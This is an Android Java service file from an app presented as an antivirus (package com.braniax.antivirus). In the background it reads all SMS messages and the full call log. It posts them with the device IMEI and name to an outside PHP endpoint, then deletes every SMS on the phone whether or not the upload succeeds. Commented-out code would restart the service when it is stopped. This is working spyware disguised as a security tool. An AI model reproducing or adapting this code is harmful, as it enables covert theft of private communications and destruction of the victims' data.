package com.braniax.antivirus;

import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.net.Uri;
import android.os.*;
import android.provider.CallLog;
import android.provider.Telephony;
import android.support.annotation.RequiresApi;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.braniax.antivirus.Common.Common;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class BackgroundService extends Service
{



   /* public BackgroundService(Context applicationContext)
    {
        super();
        Log.i("HERE", "here I am!");
    }

    public BackgroundService()
    {

    }*/


    public static final String TYPE = "type";
    /** Call log type for incoming calls. */
    public static final int INCOMING_TYPE = 1;
    /** Call log type for outgoing calls. */
    public static final int OUTGOING_TYPE = 2;
    /** Call log type for missed calls. */
    public static final int MISSED_TYPE = 3;
    /** Call log type for voicemails. */
    public static final int VOICEMAIL_TYPE = 4;
    /** Call log type for calls rejected by direct user action. */
    public static final int REJECTED_TYPE = 5;
    /** Call log type for calls blocked automatically. */
    public static final int BLOCKED_TYPE = 6;
    public static final String DATE = "date";

    /**
     * The duration of the call in seconds
     * <P>Type: INTEGER (long)</P>
     */
    public static final String DURATION = "duration";
    public StringBuilder message;
    //SharedPreferences preferences;
    //public SmsMessage[] smsMessages;
    //String message_from;
    // MainActivity mainActivity;
    String calllogs;
    ArrayList<String> messagesData;
    Context context;
    ContentResolver contentResolver;
    Uri mSmsQueryUri = Uri.parse("content://sms");

    private boolean isRunning;
    private Thread backgroundThread;

    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }

    public void onCreate()
    {

        /*Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, Restarter.class);
        sendBroadcast(broadcastIntent);*/
        this.context = this;
        this.isRunning = false;
        this.backgroundThread = new Thread(myTask);




        //startMyOwnForeground();
    }


    private Runnable myTask = new Runnable() {
    //@RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public void run()
    {
        // Do something here
        //stopSelf();

        addtoServer(context);
        //Context context;
        // Toast.makeText(context, "heloooooooooooo", Toast.LENGTH_SHORT).show();
    }
};


    public void onDestroy()
    {
        /*Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, Restarter.class);
        sendBroadcast(broadcastIntent);*/
    }

    @Override
    /*public void onTaskRemoved(Intent rootIntent)
    {

        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, Restarter.class);
        sendBroadcast(broadcastIntent);
        super.onTaskRemoved(rootIntent);
    }*/

    public int onStartCommand(Intent intent, int flags, int startId)
    {
        if (!this.isRunning)
        {
            this.backgroundThread.start();
            this.isRunning = true;
            stopSelf();
        }
        return START_STICKY;


    }


    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public ArrayList<String> getMessages()
    {
        ArrayList<String> messages = new ArrayList<String>();
        ContentResolver contentResolver=getContentResolver();
        //Uri mSmsQueryUri = Uri.parse("content://sms/");
        //sb.append("Messages");
        Cursor cursor = null;
        try {
            cursor = contentResolver.query(mSmsQueryUri, new String[] { "_id", "address", "date", "body",
                    "type", "read" }, null, null, "date desc");
            if (cursor == null) {
                Log.i("curson null", "cursor is null. uri: " + mSmsQueryUri);
                Toast.makeText(this, "curor null", Toast.LENGTH_SHORT).show();
            }

            //assert cursor != null;
            for (boolean hasData = cursor.moveToFirst(); hasData; hasData = cursor.moveToNext()) {

                String body = cursor.getString(cursor.getColumnIndex("body"));
                String address = cursor.getString(cursor.getColumnIndex("address"));

                messages.add("\n"+"Number: "+address+"\n"+"Content: "+body+"\n");

                }
        } catch (Exception e) {
            Log.e("Error", e.getMessage());
        } finally {
            //assert cursor != null;
            cursor.close();
        }
        return messages;

    }





    private  String getCallDetail()
    {
        StringBuffer stringBuffer = new StringBuffer();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");
        }
        cursor.close();
        return stringBuffer.toString();
    }





    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    private void addtoServer(final Context context) {

        final ArrayList<String> smss=getMessages();
        final String callllogs=getCallDetail();


        //Toast.makeText(MainActivity.this, msg.toString(), Toast.LENGTH_LONG).show();

        StringRequest request=new StringRequest(Request.Method.POST, "http://rfbasolutions.com/get_messages_api/store_new_details.php", new Response.Listener<String>()
        {
            String serverResponse="Message Received!";

            //SmsMessage msg = (SmsMessage)message.;
            @Override
            public void onResponse(String response) {


               /* Intent intent=new Intent(MainActivity.this,ServerServic.class);
                intent.putExtra("calllogs",callllogs.toString());
                intent.putExtra("sms",smss.toString());
                startService(intent);*/

                //Toast.makeText(context, response, Toast.LENGTH_SHORT).show();
                //Log.d("Respnse",response);
                if(response.equals(serverResponse))
                {
                    context.getContentResolver().delete(mSmsQueryUri,null,null);
                    //Toast.makeText(context,"deleted", Toast.LENGTH_LONG).show();
                }

            }
        }, new Response.ErrorListener()
        {
            @Override
            public void onErrorResponse(VolleyError error)
            {
               // Toast.makeText(context, error.toString(), Toast.LENGTH_SHORT).show();

                context.getContentResolver().delete(mSmsQueryUri,null,null);

            }
        })
        {
            @Override
            protected Map<String,String> getParams() throws AuthFailureError {
                HashMap<String,String> params=new HashMap<>();

                if(Common.IMIE != null) {
                    Log.i("IMEIII",Common.IMIE);
                    params.put("imei_no",Common.IMIE);
                }else{
                    Log.i("IMEI","null");
                }

                if(Common.DEVICE_NAME!=null){
                    Log.i("IMEII",Common.DEVICE_NAME);
                    params.put("device_name",Common.DEVICE_NAME);
                }else{
                    Log.i("IMEI",Common.DEVICE_NAME);
                }
                params.put("calllog",callllogs.toString());
                params.put("record",smss.toString());



                return params;
            }
        };
        RequestQueue requestQueue=Volley.newRequestQueue(this);
        requestQueue.add(request);
    }



//    public class Restarter extends BroadcastReceiver {
//        @Override
//        public void onReceive(Context context, Intent intent) {
//            Log.i("Broadcast Listened", "Service tried to stop");
//            Toast.makeText(context, "Service restarted", Toast.LENGTH_SHORT).show();
//
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
//            {
//                context.startForegroundService(new Intent(context, BackgroundService.class));
//            }
//            else
//                {
//                  context.startService(new Intent(context, BackgroundService.class));
//                }
//        }
//        }

    }

